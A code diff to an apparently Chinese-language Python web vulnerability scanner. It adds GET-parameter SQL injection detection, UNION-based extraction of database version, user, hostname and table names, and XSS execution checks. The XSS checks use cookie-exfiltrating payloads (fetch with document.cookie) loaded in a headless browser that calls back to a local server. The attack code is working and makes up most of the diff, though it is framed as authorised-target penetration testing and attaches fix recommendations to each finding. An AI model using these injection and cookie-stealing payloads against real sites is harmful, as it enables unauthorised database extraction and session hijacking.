@@ -35,6 +35,8 @@ import re
 import socket
 import ssl
 import sys
+import threading
+import time
 from dataclasses import dataclass, field, asdict
 from typing import Optional
 from urllib.parse import urljoin, urlparse, quote
@@ -349,6 +351,7 @@ class VulnScanner:
         self.cancel = cancel or (lambda: False)
         # 已确认的可利用向量（供渗透取证模块复用）
         self.confirmed_sqli: list = []      # [(form, field)]
+        self.confirmed_param_sqli: list = []  # [(base_url, param, qs)]
         self.confirmed_creds: list = []     # [(form, user_field, pwd_field, user, pwd)]
         self.session = requests.Session()
         self.session.headers.update({"User-Agent": ua, "Accept": "*/*"})
@@ -434,6 +437,8 @@ class VulnScanner:
         if self.do_sql:
             self._log("[*] 探测参数注入（目录遍历 / 命令注入 / CRLF）…")
             self.test_param_injection()
+            self._log("[*] 探测 GET 参数 SQL 注入…")
+            self.test_param_sqli()
         if self._cancelled():
             return self._finish()
         if self.do_creds:
@@ -733,6 +738,77 @@ class VulnScanner:
 
     # -- 目录遍历 / 命令注入 -------------------------------------------
 
+    def _param_payload(self, qs: dict, key: str, payload: str, base: str):
+        """构造注入到指定 GET 参数的请求。"""
+        params = {k: (payload if k == key else (v[0] if v else ""))
+                  for k, v in qs.items()}
+        return self._get(base, params=params)
+
+    def test_param_sqli(self) -> None:
+        """对 URL 上的每个 GET 参数做 SQL 注入探测（错误回显 / 布尔盲注 / 时间盲注）。"""
+        parsed = urlparse(self.url)
+        if not parsed.query:
+            return
+        from urllib.parse import parse_qs
+        qs = parse_qs(parsed.query, keep_blank_values=True)
+        base = self.url.split("?")[0]
+        baseline_resp = self._get(self.url)
+        baseline_t = baseline_resp.elapsed.total_seconds() if baseline_resp else 0.0
+        baseline_len = len(baseline_resp.text) if baseline_resp else 0
+
+        for key in qs:
+            if self._cancelled():
+                return
+            # 1) 错误回显
+            resp = self._param_payload(qs, key, "'", base)
+            if resp and SQL_ERROR_RE.search(resp.text):
+                m = SQL_ERROR_RE.search(resp.text)
+                self.report.add(Finding(
+                    title="疑似 SQL 注入（GET 参数·错误回显）",
+                    severity="high",
+                    description=f"参数 {key} 注入单引号后响应包含数据库错误特征：{m.group(0)[:60]}",
+                    evidence=resp.url,
+                    recommendation="使用参数化查询 / ORM，禁止拼接 SQL，统一错误处理。",
+                    url=resp.url,
+                ))
+                self.confirmed_param_sqli.append((base, key, qs))
+                continue
+            # 2) 布尔盲注（恒真 vs 恒假）
+            r_true = self._param_payload(qs, key, "1 AND 1=1", base)
+            r_false = self._param_payload(qs, key, "1 AND 1=2", base)
+            if r_true and r_false:
+                lt, lf = len(r_true.text), len(r_false.text)
+                base_len = max(lt, lf, baseline_len, 1)
+                if lt > lf and (lt - lf) / base_len >= SQL_BOOL_RATIO and \
+                   abs(lt - baseline_len) < base_len * 0.3:
+                    self.report.add(Finding(
+                        title="疑似 SQL 注入（GET 参数·布尔盲注）",
+                        severity="high",
+                        description=f"参数 {key} 恒真/恒假载荷响应差异显著（真 {lt} / 假 {lf}）。",
+                        evidence=r_false.url,
+                        recommendation="使用参数化查询，避免根据用户输入拼接查询条件。",
+                        url=r_true.url,
+                    ))
+                    self.confirmed_param_sqli.append((base, key, qs))
+                    continue
+            # 3) 时间盲注
+            for payload, label in SQL_TIME_PAYLOADS:
+                resp = self._param_payload(qs, key, payload, base)
+                if resp is None:
+                    continue
+                if resp.elapsed.total_seconds() >= baseline_t + SQL_TIME_THRESHOLD:
+                    self.report.add(Finding(
+                        title="疑似 SQL 注入（GET 参数·时间盲注）",
+                        severity="high",
+                        description=f"参数 {key} 注入 {payload!r}（{label}）后响应耗时 "
+                                    f"{resp.elapsed.total_seconds():.1f}s（基准 {baseline_t:.1f}s）。",
+                        evidence=resp.url,
+                        recommendation="使用参数化查询，对输入做白名单校验，禁止拼接。",
+                        url=resp.url,
+                    ))
+                    self.confirmed_param_sqli.append((base, key, qs))
+                    break
+
     def test_param_injection(self) -> None:
         """对 URL 上的每个参数做目录遍历与命令注入（时间盲注）探测。"""
         parsed = urlparse(self.url)
@@ -954,7 +1030,8 @@ class VulnScanner:
 
     def attempt_exploitation(self) -> None:
         """对已确认的漏洞尝试利用取证（提取信息 / 进入后台）。"""
-        if not (self.confirmed_sqli or self.confirmed_creds):
+        has_vuln = (self.confirmed_sqli or self.confirmed_param_sqli or self.confirmed_creds)
+        if not has_vuln and not self.do_xss:
             self._log("[*] 未发现可确认的可利用漏洞，跳过利用取证。")
             return
         # 1) SQL 注入 -> UNION 提取数据库信息（按 表单+字段 去重）
@@ -965,6 +1042,13 @@ class VulnScanner:
                 continue
             seen_sqli.add(key)
             self._exploit_sqli_union(form, field)
+        # 1b) GET 参数 SQL 注入 -> UNION 提取
+        seen_param = set()
+        for base, key, qs in self.confirmed_param_sqli:
+            if key in seen_param or self._cancelled():
+                continue
+            seen_param.add(key)
+            self._exploit_param_sqli_union(base, key, qs)
         # 2) 默认/弱口令 -> 登录后台抓取信息（按 表单+凭据 去重）
         seen_creds = set()
         for form, user_f, pwd_f, u, p in self.confirmed_creds:
@@ -973,6 +1057,9 @@ class VulnScanner:
                 continue
             seen_creds.add(key)
             self._exploit_creds_login(form, user_f, pwd_f, u, p)
+        # 3) XSS 执行验证（headless 浏览器 + 本地回调，仅授权目标）
+        if self.do_xss and not self._cancelled():
+            self.verify_xss()
 
     def _exploit_sqli_union(self, form: "FormInfo", field: str) -> None:
         """基于 UNION 的数据提取：定位可回显列并提取版本/库/用户等只读信息。"""
@@ -1014,16 +1101,14 @@ class VulnScanner:
         if reflect_col is None:
             reflect_col = 0  # 兜底用第 0 列
         # 3) 利用回显列提取只读信息（MySQL / 兼容方言）
+        base_resp = self._send_form_single(form, field, "1")
+        base_text = base_resp.text if base_resp else ""
         def _extract(expr: str, label: str) -> str:
             cols = ["NULL"] * col_count
             cols[reflect_col] = expr
             payload = f"' UNION SELECT {','.join(cols)} -- -"
             resp = self._send_form_single(form, field, payload)
-            if not resp:
-                return ""
-            # 取标记附近的短串（从响应里抽取表达式结果）
-            m = re.search(r"([0-9A-Za-z_ .@:/\-]{1,80})", resp.text)
-            return m.group(1)[:80] if m else ""
+            return self._diff_extract(base_text, resp)
         extracted = {}
         for expr, label in [
             ("version()", "DBMS 版本"),
@@ -1041,11 +1126,78 @@ class VulnScanner:
         payload = f"' UNION SELECT {','.join(cols)} FROM information_schema.tables "
         payload += f"WHERE table_schema=database() -- -"
         resp = self._send_form_single(form, field, payload)
-        tables = ""
-        if resp:
-            m = re.search(r"([A-Za-z0-9_,]{1,120})", resp.text)
-            if m:
-                tables = m.group(1)[:120]
+        tables = self._diff_extract(base_text, resp)
+        if tables:
+            extracted["数据表(部分)"] = tables
+        ev.success = bool(extracted)
+        ev.data = extracted
+        ev.excerpt = "; ".join(f"{k}={v}" for k, v in extracted.items()) if extracted \
+            else "UNION 可执行但未能提取到明文信息。"
+        return self._record(ev)
+
+    def _exploit_param_sqli_union(self, base: str, key: str, qs: dict) -> None:
+        """对 GET 参数的 SQL 注入做 UNION 提取（列数定位 + 回显提取）。"""
+        ev = ExploitEvidence(
+            technique="GET 参数 SQL 注入 UNION 提取",
+            target=f"参数 {key} @ {base}",
+            url=base,
+        )
+        marker = "vscan7b2c"
+
+        def _send(payload: str):
+            params = {k: (payload if k == key else (v[0] if v else ""))
+                      for k, v in qs.items()}
+            return self._get(base, params=params)
+
+        # 1) 列数：逐个试 UNION SELECT NULL,... 直到不报错
+        col_count = None
+        for n in range(1, 13):
+            if self._cancelled():
+                ev.excerpt = "用户中断"; return self._record(ev)
+            cols = ",".join(["NULL"] * n)
+            resp = _send(f"1 UNION SELECT {cols} -- -")
+            if resp and not SQL_ERROR_RE.search(resp.text) and resp.status_code == 200:
+                col_count = n
+                break
+        if not col_count:
+            ev.excerpt = "未能确定查询列数（UNION 不可用或被过滤）。"
+            return self._record(ev)
+        # 2) 定位可回显列
+        reflect_col = None
+        for i in range(col_count):
+            if self._cancelled():
+                ev.excerpt = "用户中断"; return self._record(ev)
+            cols = ["NULL"] * col_count
+            cols[i] = f"'{marker}{i}'"
+            resp = _send(f"1 UNION SELECT {','.join(cols)} -- -")
+            if resp and f"{marker}{i}" in resp.text:
+                reflect_col = i
+                break
+        if reflect_col is None:
+            reflect_col = 0
+        # 3) 提取只读信息（与基准响应做 diff，DB 无关）
+        base_resp = _send("1")
+        base_text = base_resp.text if base_resp else ""
+        extracted = {}
+        for expr, label in [
+            ("version()", "DBMS 版本"),
+            ("database()", "当前数据库"),
+            ("current_user()", "当前用户"),
+            ("@@hostname", "主机名"),
+            ("sqlite_version()", "SQLite 版本"),
+        ]:
+            cols = ["NULL"] * col_count
+            cols[reflect_col] = expr
+            resp = _send(f"1 UNION SELECT {','.join(cols)} -- -")
+            val = self._diff_extract(base_text, resp)
+            if val:
+                extracted[label] = val
+        # 4) 列表
+        cols = ["NULL"] * col_count
+        cols[reflect_col] = "group_concat(table_name)"
+        resp = _send(f"1 UNION SELECT {','.join(cols)} FROM information_schema.tables "
+                     f"WHERE table_schema=database() -- -")
+        tables = self._diff_extract(base_text, resp)
         if tables:
             extracted["数据表(部分)"] = tables
         ev.success = bool(extracted)
@@ -1106,6 +1258,172 @@ class VulnScanner:
             ("登录成功，已建立会话：" + "; ".join(f"{k}={v}" for k, v in info.items()))
         return self._record(ev)
 
+    # -- XSS 执行验证（headless + 本地回调） --------------------------
+    #
+    # ⚠️ 仅在授权目标上启用。扫描器用自身 headless 浏览器访问目标，
+    #    回调仅发往 127.0.0.1（本机），不涉及任何第三方 / 真实用户。
+
+    def _xss_payloads(self) -> list:
+        """返回带 {u} 占位符的可执行 XSS 载荷模板（回连地址在调用时填入）。"""
+        return [
+            # HTML 正文上下文
+            "<img src=x onerror=\"fetch('{u}&c='+encodeURIComponent(document.cookie))\">",
+            "<script>fetch('{u}&c='+encodeURIComponent(document.cookie))</script>",
+            "<svg onload=\"fetch('{u}&c='+encodeURIComponent(document.cookie))\">",
+            # 属性 / 双引号闭合上下文
+            "\"><img src=x onerror=\"fetch('{u}&c='+encodeURIComponent(document.cookie))\">",
+            "javascript:fetch('{u}')",
+        ]
+
+    def verify_xss(self) -> None:
+        """对 URL 参数与 GET 表单字段，用 headless 浏览器验证 XSS 是否真正执行。"""
+        try:
+            from selenium import webdriver
+            from selenium.webdriver.edge.options import Options
+        except Exception:
+            self._log("[*] 未安装 selenium，跳过 XSS 执行验证（仅保留反射检测）。")
+            return
+
+        # 1) 启动本地回调服务器
+        from http.server import BaseHTTPRequestHandler, HTTPServer
+        from urllib.parse import urlparse as _up, parse_qs as _pqs
+        hits: dict = {}
+
+        class _CB(BaseHTTPRequestHandler):
+            def do_GET(self):
+                q = _pqs(_up(self.path).query)
+                tid = (q.get("id") or [""])[0]
+                cookie = (q.get("c") or [""])[0]
+                ua = self.headers.get("User-Agent", "")
+                if tid:
+                    hits[tid] = {"cookie": cookie, "ua": ua, "path": self.path}
+                self.send_response(200)
+                self.send_header("Access-Control-Allow-Origin", "*")
+                self.end_headers()
+                self.wfile.write(b"ok")
+
+            def log_message(self, *a):
+                pass
+
+        try:
+            srv = HTTPServer(("127.0.0.1", 0), _CB)
+            port = srv.server_address[1]
+            srv_thread = threading.Thread(target=srv.serve_forever, daemon=True)
+            srv_thread.start()
+            cb_base = f"http://127.0.0.1:{port}"
+        except Exception as e:
+            self._log(f"[*] 回调服务器启动失败：{e}，跳过 XSS 执行验证。")
+            return
+
+        # 2) 启动 headless Edge
+        opts = Options()
+        opts.add_argument("--headless=new")
+        opts.add_argument("--disable-gpu")
+        opts.add_argument("--no-sandbox")
+        opts.add_argument("--disable-extensions")
+        try:
+            driver = webdriver.Edge(options=opts)
+        except Exception as e:
+            self._log(f"[*] headless 浏览器启动失败：{e}，跳过 XSS 执行验证。")
+            srv.shutdown()
+            return
+
+        # 3) 收集待测注入点（URL 参数 + GET 表单字段）
+        targets = []  # (label, url_builder(payload))
+        parsed = urlparse(self.url)
+        if parsed.query:
+            from urllib.parse import parse_qs
+            qs = parse_qs(parsed.query, keep_blank_values=True)
+            base = self.url.split("?")[0]
+            for key in qs:
+                def build(p, key=key, qs=qs, base=base):
+                    params = {k: (p if k == key else (v[0] if v else ""))
+                              for k, v in qs.items()}
+                    return requests.Request("GET", base, params=params).prepare().url
+                targets.append((f"参数 {key}", build))
+        # GET 表单字段
+        resp0 = self._get(self.url)
+        if resp0:
+            forms = self.parse_forms(resp0.text)
+            for form in forms:
+                if form.method != "get":
+                    continue
+                for name, _ in form.fields:
+                    if not name:
+                        continue
+                    def build(p, form=form, name=name):
+                        params = {n: (p if n == name else "x") for n, _ in form.fields if n}
+                        return requests.Request("GET", form.action, params=params).prepare().url
+                    targets.append((f"表单字段 {name}", build))
+
+        if not targets:
+            driver.quit(); srv.shutdown()
+            self._log("[*] 无可测试的反射注入点，跳过 XSS 执行验证。")
+            return
+
+        # 4) 逐个注入点逐个载荷，headless 加载并等待回调
+        verified = 0
+        templates = self._xss_payloads()
+        for label, build in targets:
+            if self._cancelled():
+                break
+            for idx, tmpl in enumerate(templates):
+                tag = f"t{verified}_{idx}"
+                payload = tmpl.format(u=f"{cb_base}/?id={tag}")
+                try:
+                    poc_url = build(payload)
+                    driver.get(poc_url)
+                except Exception:
+                    continue
+                # 等待回调（JS 执行 + 网络回连）
+                for _ in range(8):
+                    if tag in hits or self._cancelled():
+                        break
+                    time.sleep(0.3)
+                if tag in hits:
+                    info = hits[tag]
+                    cookie = info["cookie"]
+                    ev = ExploitEvidence(
+                        technique="XSS 执行验证（headless + 本地回调）",
+                        target=f"{label} @ {self.url}",
+                        success=True,
+                        data={
+                            "注入点": label,
+                            "PoC URL": poc_url,
+                            "回连": f"{cb_base}{info['path']}",
+                            "捕获Cookie": cookie[:120] if cookie else "（无/HttpOnly）",
+                            "UA": info["ua"][:80],
+                        },
+                        excerpt=f"载荷在 headless 浏览器中真实执行并触发回连。"
+                                f"{'已读取 document.cookie（' + cookie[:40] + '…）' if cookie else '未读到 cookie（可能 HttpOnly）'}",
+                        url=poc_url,
+                    )
+                    self.report.add(Finding(
+                        title="确认 XSS（执行验证）",
+                        severity="high",
+                        description=f"{label} 注入可执行载荷后，在 headless 浏览器中真实执行并回连本地服务器"
+                                    f"{'，可读取 document.cookie' if cookie else '（cookie 为 HttpOnly 未读取）'}。",
+                        evidence=poc_url,
+                        recommendation="对输出做上下文相关编码（HTML/属性/JS），启用 CSP，会话 Cookie 设为 HttpOnly+Secure+SameSite。",
+                        url=poc_url,
+                    ))
+                    self._record(ev)
+                    verified += 1
+                    break
+            else:
+                continue
+            # 命中即处理下一个注入点
+
+        try:
+            driver.quit()
+        except Exception:
+            pass
+        srv.shutdown()
+        if verified == 0:
+            self._log("[*] XSS 执行验证：未触发任何回连（载荷未执行或被过滤）。")
+        else:
+            self._log(f"[*] XSS 执行验证完成，确认 {verified} 个可执行 XSS 点。")
+
     def _extract_backend_links(self, resp: requests.Response) -> list:
         """从响应中抽取疑似后台/管理链接。"""
         soup = BeautifulSoup(resp.text, "html.parser")
@@ -1131,6 +1449,16 @@ class VulnScanner:
         text = re.sub(r"<style.*?</style>", " ", text, flags=re.S | re.I)
         text = re.sub(r"<[^>]+>", " ", text)
         return re.sub(r"\s+", " ", text).strip()
+
+    def _diff_extract(self, baseline_text: str, resp) -> str:
+        """从注入响应里提取“新增”文本（相对基准），DB 无关、抗 HTML 干扰。"""
+        if not resp:
+            return ""
+        u = self._sanitize(resp.text)
+        b = self._sanitize(baseline_text) if baseline_text else ""
+        bset = set(re.findall(r"\S+", b))
+        diff = [w for w in re.findall(r"\S+", u) if w not in bset]
+        return " ".join(diff)[:120].strip()
 
     def _record(self, ev: ExploitEvidence) -> None:
         self.report.exploits.append(ev)
